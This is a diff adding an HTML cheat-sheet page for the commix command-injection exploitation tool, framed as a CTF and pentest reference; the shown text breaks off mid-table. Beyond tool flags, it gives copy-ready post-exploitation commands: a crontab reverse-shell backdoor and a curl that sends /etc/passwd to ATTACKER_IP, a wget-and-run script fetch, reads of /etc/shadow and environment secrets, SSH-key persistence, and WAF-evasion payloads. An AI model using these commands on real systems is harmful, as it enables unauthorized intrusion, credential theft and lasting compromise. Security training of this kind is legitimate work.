@@ -1,0 +1,339 @@
+
+<style>
+  :root {
+    --c-bg: #0d1117;
+    --c-surface: #161b22;
+    --c-surface2: #1c2333;
+    --c-border: #30363d;
+    --c-green: #39d353;
+    --c-green-dim: #1a7f37;
+    --c-cyan: #58c8e8;
+    --c-cyan-dim: #1b6fa8;
+    --c-amber: #f0a500;
+    --c-red: #f85149;
+    --c-purple: #bc8cff;
+    --c-text: #e6edf3;
+    --c-muted: #7d8590;
+    --c-label: #b3bcc8;
+    --font-mono: 'Courier New', monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: transparent; font-family: var(--font-mono); color: var(--c-text); }
+  .root { padding: 1rem 0; }
+  .header { padding: 1.2rem 1.4rem; border-bottom: 1px solid var(--c-border); background: var(--c-surface); border-radius: 10px 10px 0 0; display: flex; align-items: center; gap: 14px; }
+  .header-icon { font-size: 28px; }
+  .header-title { font-size: 20px; font-weight: 700; color: var(--c-green); letter-spacing: 0.04em; }
+  .header-sub { font-size: 12px; color: var(--c-muted); margin-top: 2px; }
+  .tabs { display: flex; gap: 0; background: var(--c-surface); border-bottom: 1px solid var(--c-border); flex-wrap: wrap; }
+  .tab { padding: 9px 16px; font-size: 12px; color: var(--c-muted); cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.15s; font-family: var(--font-mono); border: none; background: none; white-space: nowrap; }
+  .tab:hover { color: var(--c-text); }
+  .tab.active { color: var(--c-green); border-bottom: 2px solid var(--c-green); }
+  .panel { background: var(--c-bg); border: 1px solid var(--c-border); border-radius: 0 0 10px 10px; padding: 1rem 1.2rem; }
+  .section-label { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.12em; color: var(--c-muted); margin: 1.2rem 0 0.5rem; padding-bottom: 4px; border-bottom: 1px solid var(--c-border); }
+  .section-label:first-child { margin-top: 0; }
+  .cmd-block { background: var(--c-surface); border: 1px solid var(--c-border); border-radius: 6px; padding: 0.55rem 0.85rem; margin: 5px 0; display: flex; align-items: flex-start; gap: 10px; position: relative; }
+  .cmd-block:hover { border-color: var(--c-green-dim); }
+  .prompt { color: var(--c-green-dim); font-size: 13px; flex-shrink: 0; margin-top: 1px; user-select: none; }
+  .cmd-text { font-size: 12.5px; color: var(--c-cyan); flex: 1; line-height: 1.5; word-break: break-all; }
+  .cmd-text .flag { color: var(--c-amber); }
+  .cmd-text .val { color: var(--c-purple); }
+  .cmd-text .comment { color: var(--c-muted); font-style: italic; }
+  .cmd-desc { font-size: 11px; color: var(--c-muted); margin-top: 3px; }
+  .copy-btn { position: absolute; right: 8px; top: 8px; font-size: 10px; color: var(--c-muted); cursor: pointer; padding: 2px 6px; border: 1px solid var(--c-border); border-radius: 4px; background: var(--c-surface2); opacity: 0; transition: opacity 0.15s; font-family: var(--font-mono); }
+  .cmd-block:hover .copy-btn { opacity: 1; }
+  .copy-btn:hover { color: var(--c-green); border-color: var(--c-green); }
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .flag-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .flag-table th { color: var(--c-muted); font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; padding: 6px 8px; text-align: left; border-bottom: 1px solid var(--c-border); }
+  .flag-table td { padding: 5px 8px; border-bottom: 1px solid #1e2430; vertical-align: top; line-height: 1.45; }
+  .flag-table tr:last-child td { border-bottom: none; }
+  .flag-col { color: var(--c-amber); font-size: 11.5px; white-space: nowrap; }
+  .desc-col { color: var(--c-label); }
+  .example-col { color: var(--c-purple); font-size: 11px; }
+  .badge { display: inline-block; font-size: 9.5px; padding: 1px 7px; border-radius: 10px; font-weight: 700; letter-spacing: 0.05em; margin-left: 4px; }
+  .badge-red { background: #2d1b1b; color: var(--c-red); border: 1px solid #5a2020; }
+  .badge-green { background: #1a2d1a; color: var(--c-green); border: 1px solid #254525; }
+  .badge-amber { background: #2d2410; color: var(--c-amber); border: 1px solid #5a4010; }
+  .badge-purple { background: #211b30; color: var(--c-purple); border: 1px solid #4a3870; }
+  .tip-box { background: #1a2030; border-left: 3px solid var(--c-cyan); border-radius: 0 6px 6px 0; padding: 8px 12px; margin: 6px 0; font-size: 12px; color: var(--c-label); line-height: 1.55; }
+  .warn-box { background: #2d2010; border-left: 3px solid var(--c-amber); border-radius: 0 6px 6px 0; padding: 8px 12px; margin: 6px 0; font-size: 12px; color: var(--c-label); line-height: 1.55; }
+  .danger-box { background: #2d1010; border-left: 3px solid var(--c-red); border-radius: 0 6px 6px 0; padding: 8px 12px; margin: 6px 0; font-size: 12px; color: var(--c-label); line-height: 1.55; }
+  .search-bar { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+  .search-bar input { flex: 1; background: var(--c-surface); border: 1px solid var(--c-border); border-radius: 6px; padding: 7px 12px; font-family: var(--font-mono); font-size: 12px; color: var(--c-text); outline: none; }
+  .search-bar input:focus { border-color: var(--c-green-dim); }
+  .search-bar input::placeholder { color: var(--c-muted); }
+  .hidden { display: none !important; }
+  .technique-card { background: var(--c-surface); border: 1px solid var(--c-border); border-radius: 8px; padding: 10px 12px; margin: 6px 0; }
+  .technique-title { font-size: 12px; font-weight: 700; color: var(--c-text); margin-bottom: 4px; display: flex; align-items: center; gap: 6px; }
+  .technique-desc { font-size: 11.5px; color: var(--c-muted); margin-bottom: 7px; }
+  .mini-cmd { font-size: 11px; color: var(--c-cyan); background: var(--c-bg); border: 1px solid var(--c-border); border-radius: 4px; padding: 4px 8px; margin-top: 4px; display: block; word-break: break-all; }
+  .panel-inner { display: none; }
+  .panel-inner.active { display: block; }
+</style>
+
+<div class="root">
+  <div class="header">
+    <div class="header-icon">💉</div>
+    <div>
+      <div class="header-title">COMMIX — Master Cheat Sheet</div>
+      <div class="header-sub">Command Injection Exploiter · CTF / Pentest Reference · v3.x</div>
+    </div>
+  </div>
+
+  <div class="tabs" id="tabs">
+    <button class="tab active" onclick="switchTab('basics')">Basics</button>
+    <button class="tab" onclick="switchTab('targets')">Targets & URLs</button>
+    <button class="tab" onclick="switchTab('techniques')">Techniques</button>
+    <button class="tab" onclick="switchTab('shells')">Shells</button>
+    <button class="tab" onclick="switchTab('bypass')">WAF Bypass</button>
+    <button class="tab" onclick="switchTab('post')">Post-Exploit</button>
+    <button class="tab" onclick="switchTab('flags')">All Flags</button>
+  </div>
+
+  <div class="panel">
+
+    <!-- BASICS -->
+    <div class="panel-inner active" id="pane-basics">
+      <div class="search-bar">
+        <input type="text" placeholder="🔍  filter commands..." oninput="filterCmds(this.value,'pane-basics')" />
+      </div>
+
+      <div class="section-label">Installation</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">git clone https://github.com/commixproject/commix.git <span class="comment"># clone repo</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">pip3 install commix <span class="comment"># pip install (alt)</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">--version</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">--update</span> <span class="comment"># update to latest</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Quick Start</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/page?id=1"</span></div><div class="cmd-desc">Basic URL scan — tests GET param</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/"</span> <span class="flag">--data</span> <span class="val">"user=admin&pass=test"</span></div><div class="cmd-desc">POST data injection</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/page?id=1"</span> <span class="flag">--batch</span></div><div class="cmd-desc">Non-interactive mode (auto-yes all prompts)</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/?q=INJECT_HERE"</span></div><div class="cmd-desc">Use INJECT_HERE keyword to mark injection point</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Verbosity & Output</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">-v</span> <span class="val">3</span> <span class="comment"># verbosity 0-4</span></div><div class="cmd-desc">Level 3 = show payloads; Level 4 = show HTTP traffic</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--output-dir</span> <span class="val">/tmp/commix_out</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--flush-session</span> <span class="comment"># clear cached session</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="tip-box">💡 Always use <span style="color:var(--c-cyan)">--batch</span> in automated pipelines or CTF scripts to avoid interactive prompts blocking execution.</div>
+    </div>
+
+    <!-- TARGETS & URLS -->
+    <div class="panel-inner" id="pane-targets">
+      <div class="section-label">GET Parameters</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/page.php?id=1&name=admin"</span></div><div class="cmd-desc">Scans ALL GET params automatically</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/page.php?id=INJECT_HERE"</span></div><div class="cmd-desc">Force injection point with keyword</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/page.php?id=1"</span> <span class="flag">-p</span> <span class="val">id</span></div><div class="cmd-desc">Target specific parameter only</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">POST Data</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/login"</span> <span class="flag">--data</span> <span class="val">"user=admin&pass=test"</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/api"</span> <span class="flag">--data</span> <span class="val">'{"cmd":"INJECT_HERE"}'</span> <span class="flag">--headers</span> <span class="val">"Content-Type: application/json"</span></div><div class="cmd-desc">JSON POST injection</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">HTTP Headers & Cookies</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/"</span> <span class="flag">--cookie</span> <span class="val">"PHPSESSID=abc123; user=admin"</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/"</span> <span class="flag">--headers</span> <span class="val">"X-Forwarded-For: 127.0.0.1\nAuthorization: Bearer TOKEN"</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/"</span> <span class="flag">--user-agent</span> <span class="val">"Mozilla/5.0 ..."</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"http://target.com/"</span> <span class="flag">--random-agent</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">From Burp / Request File</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-r</span> <span class="val">request.txt</span> <span class="comment"># raw HTTP request file</span></div><div class="cmd-desc">Paste Burp raw request into a .txt file</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-r</span> <span class="val">request.txt</span> <span class="flag">--force-ssl</span> <span class="comment"># for HTTPS targets</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Proxy & Network</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--proxy</span> <span class="val">http://127.0.0.1:8080</span> <span class="comment"># through Burp</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--tor</span> <span class="flag">--tor-port</span> <span class="val">9050</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--timeout</span> <span class="val">30</span> <span class="flag">--retries</span> <span class="val">3</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="tip-box">💡 Use <span style="color:var(--c-cyan)">-r request.txt</span> from a Burp intercept — most reliable for complex auth flows.</div>
+    </div>
+
+    <!-- TECHNIQUES -->
+    <div class="panel-inner" id="pane-techniques">
+      <div class="section-label">Injection Technique Flags</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--technique</span> <span class="val">C</span> <span class="comment"># classic</span></div><div class="cmd-desc">Direct echo of output — fastest, most reliable</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--technique</span> <span class="val">T</span> <span class="comment"># time-based</span></div><div class="cmd-desc">Blind — infer via sleep delays (slow but stealthy)</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--technique</span> <span class="val">F</span> <span class="comment"># file-based</span></div><div class="cmd-desc">Blind — write output to web-readable file</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--technique</span> <span class="val">CT</span> <span class="comment"># combine classic+time</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Technique Cards</div>
+      <div class="technique-card">
+        <div class="technique-title"><span class="badge badge-green">C</span> Classic (results-based) injection</div>
+        <div class="technique-desc">Output is returned directly in the HTTP response. Fastest and most reliable. Works when the app echoes command output.</div>
+        <span class="mini-cmd">python3 commix.py -u "http://t.com/?ping=INJECT_HERE" --technique C -v 3</span>
+      </div>
+      <div class="technique-card">
+        <div class="technique-title"><span class="badge badge-amber">T</span> Time-based blind injection</div>
+        <div class="technique-desc">No visible output. Infers injection success by measuring response time (e.g., sleep 5). Use <b>--time-sec</b> to set delay.</div>
+        <span class="mini-cmd">python3 commix.py -u "http://t.com/?q=1" --technique T --time-sec 5</span>
+      </div>
+      <div class="technique-card">
+        <div class="technique-title"><span class="badge badge-purple">F</span> File-based injection</div>
+        <div class="technique-desc">Writes output to a temp file on the server, then reads it back via HTTP. Needs write permission + web-accessible path.</div>
+        <span class="mini-cmd">python3 commix.py -u "http://t.com/?q=1" --technique F --web-root "/var/www/html"</span>
+      </div>
+      <div class="technique-card">
+        <div class="technique-title"><span class="badge badge-red">Semi-blind</span> Hybrid approach</div>
+        <div class="technique-desc">Commix auto-detects semi-blind conditions — when partial output is visible but not full. Let commix auto-choose by omitting --technique.</div>
+        <span class="mini-cmd">python3 commix.py -u "http://t.com/?q=1" --batch --flush-session</span>
+      </div>
+
+      <div class="section-label">Payload Tuning</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--prefix</span> <span class="val">"'"</span> <span class="flag">--suffix</span> <span class="val">"-- -"</span></div><div class="cmd-desc">Wrap payload in custom prefix/suffix</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--shellshock</span> <span class="comment"># CVE-2014-6271</span></div><div class="cmd-desc">Shellshock header injection via User-Agent/Referer</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+    </div>
+
+    <!-- SHELLS -->
+    <div class="panel-inner" id="pane-shells">
+      <div class="section-label">Interactive Pseudo-Shell</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--os-shell</span></div><div class="cmd-desc">Drop into interactive OS command shell via injection</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--os-cmd</span> <span class="val">"id && whoami && hostname"</span></div><div class="cmd-desc">Single command execution (no shell)</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Reverse Shell (connect-back)</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--reverse-shell</span></div><div class="cmd-desc">Commix spawns listener + sends reverse shell to your IP</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">#</span><div><div class="cmd-text">nc <span class="flag">-nlvp</span> <span class="val">4444</span> <span class="comment"># start listener first</span></div><div class="cmd-desc">Run this in a separate terminal before --reverse-shell</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Web Shell Upload</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--os-shell</span> <span class="flag">--web-root</span> <span class="val">"/var/www/html"</span></div><div class="cmd-desc">Upload PHP web shell via file-based technique</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--file-write</span> <span class="val">shell.php</span> <span class="flag">--file-dest</span> <span class="val">"/var/www/html/shell.php"</span></div><div class="cmd-desc">Upload arbitrary file to remote server</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">File Operations</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--file-read</span> <span class="val">"/etc/passwd"</span></div><div class="cmd-desc">Read a remote file — output printed locally</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--file-read</span> <span class="val">"/etc/shadow"</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--file-read</span> <span class="val">"/proc/self/environ"</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="tip-box">💡 After --os-shell, use standard Linux commands. Tab completion works. Type <span style="color:var(--c-cyan)">exit</span> to leave shell mode.</div>
+      <div class="warn-box">⚠️ --reverse-shell requires your attacker machine to be reachable by target. Use a VPN IP (tun0) in CTFs.</div>
+    </div>
+
+    <!-- WAF BYPASS -->
+    <div class="panel-inner" id="pane-bypass">
+      <div class="section-label">Tamper & Encoding</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--tamper</span> <span class="val">space2ifs</span> <span class="comment"># space → ${IFS}</span></div><div class="cmd-desc">Bypass space-based WAF filters</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--tamper</span> <span class="val">base64encode</span></div><div class="cmd-desc">Base64-encode the payload</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--tamper</span> <span class="val">hexencode</span></div><div class="cmd-desc">Hex encode the payload</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--tamper</span> <span class="val">space2ifs,base64encode</span></div><div class="cmd-desc">Chain multiple tampers with comma</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Rate Limiting & Evasion</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--delay</span> <span class="val">2</span> <span class="comment"># 2s between requests</span></div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--random-agent</span> <span class="flag">--delay</span> <span class="val">3</span></div><div class="cmd-desc">Random UA + delay combo — evade basic WAF</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Chunked Transfer / HTTP Tricks</div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--chunked</span></div><div class="cmd-desc">Send POST data in chunked encoding</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">$</span><div><div class="cmd-text">python3 commix.py <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--skip-waf</span></div><div class="cmd-desc">Disable WAF detection & skip protection check</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Manual Payload Tricks (in shell)</div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text"><span class="val">c\at${IFS}/etc/passwd</span> <span class="comment"># backslash escape cat</span></div></div></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text"><span class="val">$(echo${IFS}Y2F0</span> <span class="val">|base64${IFS}-d)${IFS}/etc/passwd</span></div></div></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text"><span class="val">w'h'o'a'm'i</span> <span class="comment"># quote-split bypass</span></div></div></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text"><span class="val">who$@ami</span> <span class="comment"># $@ = empty string in bash</span></div></div></div>
+
+      <div class="warn-box">⚠️ Tamper scripts are in <span style="color:var(--c-cyan)">commix/src/core/tamper/</span> — you can write custom .py tampers and drop them there.</div>
+    </div>
+
+    <!-- POST-EXPLOIT -->
+    <div class="panel-inner" id="pane-post">
+      <div class="section-label">Recon After Shell</div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">id; whoami; uname -a; hostname</div><div class="cmd-desc">Basic identity + OS recon</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">cat /etc/passwd; cat /etc/shadow 2>/dev/null</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">env; printenv | grep -iE "pass|key|secret|token|api"</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">find / -perm -u=s -type f 2>/dev/null</div><div class="cmd-desc">SUID binaries for privilege escalation</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">sudo -l 2>/dev/null</div><div class="cmd-desc">Check sudo permissions without password</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">netstat -tulnp 2>/dev/null || ss -tulnp</div><div class="cmd-desc">List open ports / internal services</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">cat /var/www/html/config.php 2>/dev/null || find /var/www -name "*.php" | xargs grep -l "pass\|db_" 2>/dev/null</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Persistence</div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /var/spool/cron/crontabs/www-data</div><div class="cmd-desc">Crontab backdoor — runs every minute</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">echo "ssh-rsa AAAA...your_pubkey" >> ~/.ssh/authorized_keys</div><div class="cmd-desc">Add SSH key for persistence</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="section-label">Data Exfiltration</div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">curl -d "$(cat /etc/passwd)" http://ATTACKER_IP/collect</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+      <div class="cmd-block"><span class="prompt">&gt;</span><div><div class="cmd-text">wget -q http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh 2>&1 | tee /tmp/lp_out.txt</div><div class="cmd-desc">Download and run linpeas for privesc enumeration</div></div><button class="copy-btn" onclick="cp(this)">copy</button></div>
+
+      <div class="danger-box">🔴 All post-exploitation must only be performed on systems you own or have explicit written authorization to test. Unauthorized access is illegal.</div>
+    </div>
+
+    <!-- ALL FLAGS -->
+    <div class="panel-inner" id="pane-flags">
+      <div class="search-bar">
+        <input type="text" placeholder="🔍  search flags..." oninput="filterTable(this.value)" />
+      </div>
+      <table class="flag-table" id="flag-table">
+        <thead><tr><th>Flag</th><th>Description</th><th>Example value</th><th>Tag</th></tr></thead>
+        <tbody>
+          <tr><td class="flag-col">-u, --url</td><td class="desc-col">Target URL</td><td class="example-col">"http://t.com/?id=1"</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">-r</td><td class="desc-col">Load raw HTTP request from file</td><td class="example-col">request.txt</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--data</td><td class="desc-col">POST data string</td><td class="example-col">"user=a&pass=b"</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">-p</td><td class="desc-col">Parameter(s) to inject</td><td class="example-col">id,name</td><td><span class="badge badge-green">core</span></td></tr>
+          <tr><td class="flag-col">--cookie</td><td class="desc-col">HTTP cookie header</td><td class="example-col">"SESS=abc"</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--headers</td><td class="desc-col">Extra HTTP headers</td><td class="example-col">"X-Api-Key: ABC"</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--user-agent</td><td class="desc-col">Custom User-Agent</td><td class="example-col">"Mozilla/5.0"</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--random-agent</td><td class="desc-col">Random browser UA</td><td class="example-col">—</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--referer</td><td class="desc-col">HTTP Referer header</td><td class="example-col">"http://t.com/"</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--proxy</td><td class="desc-col">HTTP proxy</td><td class="example-col">http://127.0.0.1:8080</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--tor</td><td class="desc-col">Use Tor network</td><td class="example-col">—</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--tor-port</td><td class="desc-col">Tor SOCKS port</td><td class="example-col">9050</td><td><span class="badge badge-cyan">request</span></td></tr>
+          <tr><td class="flag-col">--timeout</td><td class="desc-col">Connection timeout (secs)</td><td class="example-col">30</td><td><span class="badge badge-cyan">request</span></td></tr>
